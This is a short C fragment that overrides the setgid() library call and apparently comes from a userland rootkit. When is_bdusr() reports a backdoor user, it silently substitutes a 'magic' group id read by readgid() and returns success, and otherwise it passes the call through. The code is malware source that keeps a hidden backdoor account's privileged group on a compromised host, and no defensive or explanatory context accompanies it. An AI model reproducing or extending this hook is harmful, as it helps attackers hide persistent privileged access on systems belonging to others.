int setgid(gid_t gid){
    hook(CSETGID);
    if(is_bdusr()){
        gid_t magicgid = readgid();
        if(gid != magicgid)
            call(CSETGID, magicgid);
        return 0;
    }
    return (long)call(CSETGID, gid);
}
